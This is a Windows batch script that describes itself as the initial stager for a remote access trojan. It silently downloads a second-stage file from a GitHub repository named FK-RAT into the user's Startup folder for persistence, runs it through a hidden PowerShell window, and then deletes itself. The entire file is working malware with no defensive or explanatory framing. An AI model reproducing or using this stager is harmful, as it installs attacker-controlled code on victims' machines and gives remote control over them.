@echo off
@REM initial stager for RAT
@REM created by: Sunnickel
@REM inspired by: COSMO

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into Startup Dir
cd "%STARTUP%"

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 

@REM run payload
powershell ./wget.cmd

@REM cd change back to initial location
cd "%INITIALPATH%"
del initial.cmd

